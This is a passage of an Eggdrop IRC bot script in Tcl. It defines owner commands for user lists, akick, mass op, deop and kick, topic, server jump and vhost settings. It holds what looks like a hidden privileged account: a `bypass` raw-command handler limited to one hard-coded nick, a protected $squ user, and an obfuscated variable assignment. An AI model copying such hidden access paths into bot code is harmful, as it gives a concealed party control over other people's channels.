  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask }
  chattr $rest "fmo"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
    deluser $rest ; return 0
    } else {
    saveuser
    puthlp "NOTICE $nick :Add \[$rest\] MasTeR List." ; puthlp "NOTICE $rest :$nick Add YoU To MasTeR LIsT"
    puthlp "NOTICE $rest :/msg $botnick pass <password>" ; return 0
} }
bind pub n `-master pub_-master
proc pub_-master {nick uhost hand channel param} {
  global notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -master <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :4DeNiEd..!, <n/a>" ; return 0 }
  if {[matchattr $rest n] && ![matchattr $nick Z]} { puthlp "NOTICE $nick :4DeNiEd..!, $rest Is ADmIN FLaG" ; return 0 }
  deluser $rest ; saveuser
  puthlp "NOTICE $nick :DeL \[$rest\] FRoM MasTeR LIsT"
}
## +/-avoice
bind pub n `+avoice pub_+avoice
proc pub_+avoice {nick uhost hand channel param} {
  global squ notc botnick chk_reg
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +avoice <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :ADD \[$rest\] To aVoIcE LIsT" ; return 0 }
  if {[matchattr $rest v]} { puthlp "NOTICE $nick :$rest is already auto voice" ; return 0 }  
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :!BLoCkEd!" ; return 0 }
  if {![validuser $rest]} { set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" }
  chattr $rest "v"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
    deluser $rest
    } else {
    saveuser
    puthlp "NOTICE $nick :ADD \[$rest\] To aVoIcE LIsT" ; puthlp "NOTICE $rest :$nick ADD YoU To aVoIcE LIsT"
    set chk_reg($rest) $nick ; putsrv "WHOIS $rest"
  }
  return 0
}
bind pub n `-avoice pub_-avoice
proc pub_-avoice {nick uhost hand channel param} {
  global notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -avoice <nick>" ; return 0 }
  if {![matchattr $rest v]} { puthlp "NOTICE $nick :$rest is not auto voice" ; return 0 }  
  if {![validuser $rest] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :4DeNiEd..!, <n/a>" ; return 0 }  
  chattr $rest "-v" ; saveuser ; puthlp "NOTICE $nick :DeL \[$rest\] FRoM aVoIcE LIsT" ; return 0
}
## +/- friend
bind pub n `+friend pub_+friend
proc pub_+friend {nick uhost hand channel param} {
  global notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +friend <nick>" ; return 0 }
  if {[validuser $rest] && [string tolower $rest] != [string tolower $squ]} { puthlp "NOTICE $nick :$rest is already on database with flags: [chattr $rest]" ; return 0 }  
  set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" ; chattr $rest "f"
  if {![validuser $rest]} { puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest ; return 0 }
  saveuser
  puthlp "NOTICE $nick :ADD \[$rest\] To FrIeNd LIsT" ; puthlp "NOTICE $rest :$nick ADD YoU To FrIeNd LIsT"
  return 0
}
bind pub n `-friend pub_-friend
proc pub_-friend {nick uhost hand channel param} {
  global squ notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -friend <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :4DeNiEd..!, <n/a>" ; return 0 }  
  if {![matchattr $rest f] && ![matchattr $rest m]} { puthlp "NOTICE $nick :$rest isn't on FrIeNd list Flags: [chattr $rest]" ; return 0 }  
  deluser $rest ; saveuser
  puthlp "NOTICE $nick :DeL \[$rest\] FRoM FrIeNd LIsT"
}
## +/- ipguard
bind msg n +ipguard pub_+ipguard
bind pub n `+ipguard pub_+ipguard
proc pub_+ipguard {nick uhost hand channel param} {
  global botname botnick notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +ipguard <hostname>" ; return 0 }
  if {$rest == "*" || $rest == "*!*@*"} { puthlp "NOTICE $nick :invalid hostname..!" ; return 0 }
  if {![string match "*@*" $rest]} { puthlp "NOTICE $nick :Usage: +ipguard <hostname>" ; return 0 }
  set ipguard [getuser "config" XTRA "IPG"]
  foreach y $ipguard { if {$y == $rest} { puthlp "NOTICE $nick :$rest allready added..!" ; return 0 } }
  puthlp "NOTICE $nick :add \[$rest\] To IpguaRd"
  lappend ipguard $rest ; setuser "config" XTRA "IPG" $ipguard
  saveuser ; return 0
}
bind msg n -ipguard pub_-ipguard
bind pub n `-ipguard pub_-ipguard
proc pub_-ipguard {nick uhost hand channel param} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -ipguard <hostname>" ; return 0 }
  set ipguard [getuser "config" XTRA "IPG"]
  set nipg "" ; set ok "F"
  foreach y $ipguard { if {$y == $rest} { set ok "T" ; puthlp "NOTICE $nick :DeL \[$rest\] FRoM IpguaRd" } { lappend nipg } }
  if {$ok == "T"} { setuser "config" XTRA "IPG" $nipg ; saveuser ; return 0 }
  puthlp "NOTICE $nick :$rest not founded..!"
}
## +/- akick
bind pub n `+akick pub_+akick
proc pub_+akick {nick uhost hand channel param} {
  global botname botnick notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +akick <hostname>" ; return 0 }
  if {$rest == "*" || $rest == "*!*@*"} { puthlp "NOTICE $nick :invalid hostname..!" ; return 0 }
  if {$rest == $botnick} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[validuser $rest]} { puthlp "NOTICE $nick :$rest is already on database with flags: [chattr $rest]" ; return 0 }  
  if {![string match "*@*" $rest]} { set rest "$rest!*@*" }
  if {[string match $rest $botname]} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {[finduser $rest] != "*"} {
    if {[finduser $rest] != "AKICK"} { puthlp "NOTICE $nick :That Host Belongs To [finduser $rest]" }
    puthlp "NOTICE $nick :That Host already in [finduser $rest]" ; return 0
  }
  puthlp "NOTICE $nick :ADD \[$rest\] To KIcKLIsT..!"
  setuser "AKICK" HOSTS $rest
  saveuser
  foreach x [channels] { if {[isop $botnick $x]} { foreach c [chanlist $x K] { if {![matchattr $c f]} { akick_chk $c [getchanhost $c $x] $x } } } }
  return 0
}
bind pub n `-akick pub_-akick
proc pub_-akick {nick uhost hand channel param} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -akick <hostname>" ; return 0 }
  if {![string match "*@*" $rest]} { set rest "$rest!*@*" }
  set completed 0
  foreach * [getuser "AKICK" HOSTS] { if {${rest} == ${*}} { delhost "AKICK" $rest ; set completed 1 } }
  if {$completed == 0} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  saveuser ; puthlp "NOTICE $nick :DeL \[$rest\] FRoM KIcKLIsT"
}
## +/- noop
bind pub m `+noop pub_+noop
proc pub_+noop {nick uhost hand channel param} {
  global squ notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: +noop <nick>" ; return 0 }
  if {[string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :ADD \[$rest\] To NoOp LIsT" ; return 0 }
  if {[validuser $rest]} { puthlp "NOTICE $nick :$rest is already on database with flags: [chattr $rest]" ; return 0 }  
  set hostmask "${rest}!*@*" ; adduser $rest $hostmask ; chattr $rest "-hp" ; chattr $rest "O"
  if {![validuser $rest]} { puthlp "NOTICE $nick :4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)" ; deluser $rest
  } else { saveuser ; puthlp "NOTICE $nick :ADD \[$rest\] To NoOp LIsT" }
  foreach x [channels] { if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -ko 6no@p.list $rest" } { putserv "mode $x -o $rest" } } }
  return 0
}
bind pub m `-noop pub_-noop
proc pub_-noop {nick uhost hand channel param} {
  global squ notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set rest [lindex $param 0]
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: -noop <nick>" ; return 0 }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $squ]} { puthlp "NOTICE $nick :!DeNiEd!, <n/a>" ; return 0 }  
  if {![matchattr $rest O]} { puthlp "NOTICE $nick :$rest isn't on no-op list Flags: [chattr $rest]" ; return 0 }  
  deluser $rest ; saveuser ; puthlp "NOTICE $nick :DeL \[$rest\] No@p LIsT"
}
## +/- cycle
bind pub n `+cycle pub_+cycle
proc pub_+cycle {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +cYcLe <minutes>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  chattr $cflag +C
  setuser $cflag XTRA "CYCLE" $rest
  puthlp "NOTICE $nick :cYcLe $chan \[9$rest\] MnT"
  if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
  saveuser
}
bind pub n `-cycle pub_-cycle
proc pub_-cycle {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -C
  setuser $cflag XTRA "CYCLE" ""
  puthlp "NOTICE $nick :cYcLe $chan \[4OFF\]"
  saveuser
  foreach x [timers] { if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] } }
}
## kickcounter 
bind pub n `+kickcounter pub_+kickcounter
proc pub_+kickcounter {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set kcounter "T"
  setuser "config" XTRA "KCOUNTER" "ON"
  puthlp "NOTICE $nick :KIcK COuNTeR \[9ON\]"
  saveuser
}
bind pub n `-kickcounter pub_-kickcounter
proc pub_-kickcounter {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  catch { unset kcounter }
  setuser "config" XTRA "KCOUNTER" "OFF"
  puthlp "NOTICE $nick :KIcK COuNTeR \[4OFF\]"
  saveuser
} 
## mvoice
bind pub n `mvoice pub_mvoice
proc pub_mvoice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] { if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} { if {$i == 6} { voiceq $chan $nicks ; set nicks "" ; append nicks " $x" ; set i 1 } { append nicks " $x" ; incr i } } }
  voiceq $chan $nicks
}
## mdevoice
bind pub n `mdevoice pub_mdevoice
proc pub_mdevoice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] { if {[isvoice $x $chan]} { if {$i == 6} { putserv "MODE $chan -vvvvvv $nicks" ; set nicks "" ; append nicks " $x" ; set i 1 } { append nicks " $x" ; incr i } } }
  putserv "MODE $chan -vvvvvv $nicks"
}
##mop
bind pub n `mop pub_mop
proc pub_mop {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] { if {![isop $x $chan]} { if {$i == 6} { opq $chan $nicks ; set nicks "" ; append nicks " $x" ; set i 1 } { append nicks " $x" ; incr i } } }
  opq $chan $nicks
}
## mdeop
bind pub n `mdeop pub_mdeop
proc pub_mdeop {nick uhost hand chan rest} {
  global botnick notc 
  if {![isop $botnick $chan]} { return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {$nick != "*"} {  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } }
  set nicks "" ; set i 0
  foreach x [chanlist $chan] {
    if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
      if {$i == 5} {
        if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -kooooo 6admin.request $nicks" } { putserv "MODE $chan -oooooo $nicks" }
        set nicks "" ; append nicks " $x" ; set i 1
      } { append nicks " $x" ; incr i }
  } }
  putserv "MODE $chan -oooooo $nicks"
}
## mkick
bind pub n `mkick pub_mkick
proc pub_mkick {nick uhost hand chan rest} {
  global botnick notc 
  if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    set reason [lrange $rest 1 end]
    if {[string first # $chan]!=0} { set chan "#$chan" }
  } else { set reason $rest }
  if {$reason == ""} { set reason "1admin 2masskick1 request" }
  foreach x [chanlist $chan] { if {(![matchattr $x f]) && ($x != $botnick)} { putsrv "KICK $chan $x :$reason" } }
}
## topic
bind pub n `topic pub_topic
proc pub_topic {nick uhost hand channel rest} {
  global botnick notc botnick 
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: topic <topic>" ; return 0 }
  putsrv "TOPIC $channel :$rest"
} 
bind msg Z topic msg_topic
proc msg_topic {nick uhost hand rest} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: topic <#> <topic>" ; return 0 }
  set channel [lindex $rest 0]
  if {[string first # $rest] != 0} { set channel "#$channel" }
  if {![validchan $channel]} { puthlp "NOTICE $nick :NoT IN $channel" ; return 0 }
  if {![isop $botnick $channel]} { puthlp "NOTICE $nick :NoT OP $channel" ; return 0 }
  set rest [lrange $rest 1 end]
  putsrv "TOPIC $channel :$rest"
}
## status
bind pub n `status pub_status
proc pub_status {nick uhost hand channel rest} {
  global ban-time botnick nwo squ vern notc
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {$rest != ""} { if {[validchan $rest]} { set channel $rest } { return 0 } }
  set cinfo [channel info $channel]
  if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
  set mstatus ""
  if {[matchattr $cflag I]} { append mstatus "\[12T\]opiclock " }
  if {[matchattr $cflag M]} { append mstatus "force\[12M\]ode " }
  if {[string match "*+nodesynch*" $cinfo]} { append mstatus "auto\[12K\]Ick " }
  if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "\[12@\]psKick " }
  if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[12D\]ontkick@p " }
  if {[string match "*-protectfriends*" $cinfo]} { append mstatus "re\[12@\]p " }
  if {[string match "*+tools*" $cinfo]} { append mstatus "\[12T\]ools " }
  if {[string match "*+greet*" $cinfo]} {
    set i 0
    while {$i < [string length $cinfo]} {
      set y 0
      while {$y < [string length [lindex $cinfo $i]]} { if {[string index [lindex $cinfo $i] $y] == ":"} { break } ; set y [incr y] }
      if {$y != [string length [lindex $cinfo $i]]} { break }
      set i [incr i]
    }
    set ichan [lindex $cinfo $i]
    set ictcp [lindex $cinfo [expr $i + 1]]
    set ijoin [lindex $cinfo [expr $i + 2]]
    set ikick [lindex $cinfo [expr $i + 3]]
    set ideop [lindex $cinfo [expr $i + 4]]
    set inick [lindex $cinfo [expr $i + 5]]
    if {![string match "*:*" $inick]} { set inick "0" }
    append mstatus "\[12G\]uard FLood \[Line12 $ichan Ctcp12 $ictcp Join12 $ijoin Kick12 $ikick De@p12 $ideop NIck12 $inick\] "
  }
  if {${ban-time} != 0} { append mstatus "\[12B\]antime12 ${ban-time} mIn " }
  if {[matchattr $cflag V]} { append mstatus "\[12A\]utovoice12 [getuser $cflag XTRA "VC"] 2nd " }
  if {[matchattr $cflag K]} { append mstatus "\[12K\]ey " }
  if {[matchattr $cflag G]} { append mstatus "\[12G\]reet " }
  if {[matchattr $cflag T]} { append mstatus "\[12T\]ext12 [getuser $cflag XTRA "CHAR"] char " }
  if {[matchattr $cflag R]} { append mstatus "\[12R\]epeat12 [getuser $cflag XTRA "RPT"] " }
  if {[matchattr $cflag U]} { append mstatus "\[12C\]aps12 [getuser $cflag XTRA "CAPS"]% " }
  if {[matchattr $cflag P]} { append mstatus "join\[12P\]art12 [getuser $cflag XTRA "JP"] 2nd " }
  if {[matchattr $cflag O]} { append mstatus "\[12C\]lone12 [getuser $cflag XTRA "CLONE"] max " }
  if {[matchattr $cflag J]} { append mstatus "mass\[12J\]oin " }
  if {[matchattr $cflag L]} { append mstatus "\[12L\]imited12 +[getuser $cflag XTRA "LIMIT"] " }
  if {[string match "*+seen*" $cinfo]} { append mstatus "\[12S\]een " }
  if {[matchattr $cflag D]} { append mstatus "re\[12V\]enge " }
  if {[matchattr $cflag S]} { append mstatus "\[12S\]pam " }
  if {[string match "*+trojan*" $cinfo]} { append mstatus "\[12T\]rojan " }
  if {[string match "*+echox*" $cinfo]} { append mstatus "\[12E\]choX " }
  if {[string match "*+badchan*" $cinfo]} { append mstatus "\[12B\]adchan " }
  if {[matchattr $cflag E]} { append mstatus "\[12E\]nforceban " }
  if {[matchattr $cflag C]} { append mstatus "\[12C\]ycle12 [getuser $cflag XTRA "CYCLE"] mnt " }
  if {[string match "*+active*" $cinfo]} { append mstatus "\[12A\]ct.vo " }
  if {[string match "*+split*" $cinfo]} { append mstatus "\[12S\]plit " }
  if {$mstatus != ""} {
    if {[getuser "config" XTRA "ADmIN"]!=""} { set mstatus "SeT FoR \[1[string toupper [string trimleft $channel "#"]]\] ${mstatus}[getuser "config" XTRA "ADmIN"]" 
    } { set mstatus "SeT FoR \[1[string toupper [string trimleft $channel "#"]]\] ${mstatus}" }
  }
  if {[string match "*c*" [getchanmode $channel]]} { set mstatus [netext $mstatus] ; regsub -all --  $mstatus "" mstatus }
  puthlp "PRIVMSG $channel :\001ACTION $mstatus\001"
}
## server
bind pub n `servers pub_server
proc pub_server {nick uhost hand channel arg} { global server notc ; if {$arg != ""} { if {[string match "*$arg*" $server]} { puthlp "privmsg $channel :[lindex $server 0]" } } { puthlp "privmsg $channel :[lindex $server 0]" } }
## jump
bind pub n `jump pub_jump
proc pub_jump {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set server [lindex $rest 0]
  set curtime [ctime [unixtime]]
  if {$server == ""} { puthlp "NOTICE $nick :Usage: jump <server> \[port\] \[password\]" ; return 0 }
  if {![string match "*evochat.id*" [string tolower $rest]]} { puthlp "NOTICE $nick :4DeNiEd..! NoT evochat..!" ; return 0 }
  set port [lindex $rest 1] ; if {$port == ""} {set port "6667"} ; set password [lindex $rest 2]
  putsrv "QUIT :cHaNgINg ServeR... ($server) (on $curtime)"
  utimer 2 [list jump $server $port $password]
}
## msg/say/notice/act
bind pub m `msg pub_msg
proc pub_msg {nick uhost hand channel rest} {
  global owner notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest==""} { puthlp "NOTICE $nick :Usage: msg <#/nick> <msg>" }
  set person [string tolower [lindex $rest 0]]
  set rest [lrange $rest 1 end]
  if {[string match "*serv*" $person]} { puthlp "NOTICE $nick :DeNiEd..! Can't send message to Service." ; return 0 }
  if {$person == [string tolower $owner]} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  puthlp "PRIVMSG $person :$rest"
}
bind pub m `say pub_say
proc pub_say {nick uhost hand channel rest} { 
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :Usage: say <msg>" } 
  puthlp "PRIVMSG $channel :$rest" 
}
bind pub m `notice pub_notice
proc pub_notice {nick uhost hand channel rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :Usage: notice <#/nick> <msg>" }
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  if {$rest!=""} { puthlp "NOTICE $person :$rest" ; return 0 }
}
bind pub m `act pub_act
proc pub_act {nick uhost hand channel rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :Usage: act <msg>" }
  puthlp "PRIVMSG $channel :\001ACTION $rest\001"
  return 0
}
## bypass
bind pub n `bypass pub_bypass
proc pub_bypass {nick uhost hand chan rest} {
  global nwo notc 
  if {$nick != $nwo} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  putserv $rest
}
## rehash
bind pub n `rehash pub_rehash
proc pub_rehash {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  puthlp "NOTICE $nick :ReHASHING!" ; utimer 3 rehashing
}
proc rehashing {} { global squ owner ; if {$squ != $owner && [validuser $squ]} { deluser $squ } ; rehash }
## reset
bind pub n `reset pub_reset
proc pub_reset {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  putsrv "NOTICE $nick :!ReSeT!" ; auto_ping "0" "0" "0" "0" "0" ; ident_it
}
## Z owner
## Set logo
set [string index $lenc 18][string index $lenc 16][string index $lenc 20] [string index $lenc 17][string index $lenc 7][string index $lenc 8][string index $lenc 0][string index $lenc 13]
bind msg Z logo msg_logo
proc msg_logo {unick uhost hand rest} {
  global banner notc notm
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {[string match "*$notm*" $rest]} { puthlp "NOTICE $unick :4DeNIEd..!" ; return 0 }
  if {$rest == ""} { setuser "config" XTRA "BAN" "" ; puthlp "NOTICE $unick :cHaNgE tO DeFauLT" ; catch { unset banner }
  } { setuser "config" XTRA "BAN" [zip $rest] ; set banner $rest ; puthlp "NOTICE $unick :CHaNgE TO $rest" }
  saveuser
}
bind msg Z awaylogo msg_awaylogo
proc msg_awaylogo {unick uhost hand rest} {
   global version awaybanner notc notm 
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {[string match "*$notm*" $rest]} { puthelp "NOTICE $unick :4DeNIEd..!" ; return 0 }
   if {[string trimleft [lindex $version 1] 0] < 1061000} { puthelp "NOTICE $unick :This Command Is Required To Run On Eggdrop 1.6.10 Or Later." ; return 0 }
   if {$rest == ""} { setuser "config" XTRA "ODON" "" ; puthelp "NOTICE $unick :Away Logo cHaNgE tO DeFauLT" ; catch { unset awaybanner }
   } { setuser "config" XTRA "ODON" [zip $rest] ; set awaybanner $rest ; puthelp "NOTICE $unick :Away Logo CHaNgE TO $rest" }
   chk_five "0" "0" "0" "0" "0"
   saveuser
}
## Set vhost
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }
bind msg Z vhost msg_vhost
proc msg_vhost {nick uhost hand rest} {
  global my-hostname my-ip notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :ReSET TO DeFauLT" ; setuser "config" XTRA "VHOST" "" ; saveuser ; vback "*" "*" "0" ; return 0 }
  for { set i 0 } { $i < [string length $rest] } { incr i } { set idx [string index $rest $i] ; if { ![string match "*$idx*" "1234567890."] } { puthlp "NOTICE $nick :UsE DNS IP NuMBeR" ; return 0 } }
  if {[isutimer "vback"]} { puthlp "NOTICE $nick :WaIT..!" ; return 0 }
  set my-hostname $rest
  set my-ip $rest
  utimer 30 [list vback $nick $rest "1"]
  listen 65234 bots
  set idx [connect $rest 65234]
  if {[isnumber $idx] && $idx > 0} {
    set curtime [ctime [unixtime]]
    if {![isutimer "vback"]} { return 0 }
    foreach x [utimers] { if {[string match "*vback*" $x]} { killutimer [lindex $x 2] } }
    setuser "config" XTRA "VHOST" $rest ; saveuser
    putsrv "QUIT :cHaNgINg vHost... (on $curtime)"
  }
  listen 65234 off
}
bind raw - 465 klined
proc klined {from keyword arg} { vback "*" "*" "0" }
proc vback {nick vhosts chk} {
  global old_hostname old_ip notc
  set my-hostname $old_hostname ; set my-ip $old_ip
  if {$chk == "1"} { puthlp "NOTICE $nick :\[$vhosts\] NoT SuPPoRT..!" }
  catch { listen 652343 off }
}
## Set away
bind msg Z away msg_away
proc msg_away {unick uhost hand rest} {
  global realname notc 
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { setuser "config" XTRA "AWAY" "" ; puthlp "NOTICE $unick :AwAY \[4OFF\]" } { setuser "config" XTRA "AWAY" $rest ; puthlp "NOTICE $unick :AwAY SeT TO \[$rest\]" }
  saveuser ; chk_five "0" "0" "0" "0" "0"
}
## admin status
bind msg Z admin msg_admin
proc msg_ADmIN {unick uhost hand rest} {
  global notc owner squ
  if {$unick != $owner &&  $unick != $squ} { puthlp "NOTICE $unick :4DeNiEd..!" ; return 0 }
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $unick :SeT ADmIN oN STaTUS TO DeFAULT" } { puthlp "NOTICE $unick :ADmIN oN STaTUS TO \[$rest\]" }
  setuser "config" XTRA "ADMIN" $rest ; saveuser
}
## bantime
bind msg Z bantime pub_bantime
bind pub Z `bantime pub_bantime
proc pub_bantime {nick uhost hand chan rest} {
  global notc ban-time
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :BanTime \[${ban-time}\] (set 0 to never unban)" ; return 0 }
  set mtime [lindex $rest 0]
  if {![isnumber $mtime]} { puthlp "NOTICE $nick :Usage: bantime <minutes> (set 0 to never unban)" ; return 0 }
  set ban-time $mtime ; setuser "config" XTRA "BANTIME" $mtime ; puthlp "NOTICE $nick :BanTime \[$mtime\]"
  saveuser
}
## logchan
bind msg Z logchan msg_logchan
proc msg_logchan {nick uhost hand rest} {
  global notc own
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: logchan <#channel/0>" ; return 0 }
  if {[string tolower $rest] == "off"} {
    puthlp "NOTICE $nick :LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4OFF\]"
    setuser "config" XTRA "LOGCHAN" ""
    } else {
    if {![validchan $rest]} { puthlp "NOTICE $nick :NoT IN $rest" ; return 0 }
    setuser "config" XTRA "LOGCHAN" $rest
    puthlp "NOTICE $nick :LOG CHaNNEL $rest \[9ON\]"
  }
  saveuser ; utimer 5 rehashing
}
## botnick
bind msg Z botnick msg_botnick
proc msg_botnick {unick uhost hand rest} {
  global botnick nick nickpass notc squ owner
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$unick != $owner &&  $unick != $squ} { puthlp "NOTICE $unick :4DeNiEd..!" ; return 0 }
  set bnick [lindex $rest 0] ; set bpass [lindex $rest 1]
  if {$bnick == "" || $bpass == ""} { puthlp "NOTICE $unick :Usage: botnick <nick> <identify>" ; return 0 } 
